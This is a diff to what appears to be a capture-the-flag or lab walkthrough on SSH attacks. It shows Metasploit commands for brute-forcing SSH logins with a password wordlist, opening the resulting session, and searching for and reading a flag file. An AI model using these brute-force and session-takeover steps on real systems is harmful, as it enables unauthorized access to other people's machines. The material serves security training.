@@ -391,7 +391,9 @@ SSH (Secure Shell) is a remote administration protocol that offers encryption an
 - `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt`
 - `run` = when this module finds matching credentials, it will automatically establish a ssh session.
 - `sessions` to show the active sessions
-- `sessions 1` to connect with the session 1
+- `sessions -i 1` to connect with the session 1
+- `find / -name "flag"`
+- `cat /flag`
 In our situation we were successfull, however when you can't fint matching credentials your can try to enumerate the user first:
 
 **SSH Enumerate Users**
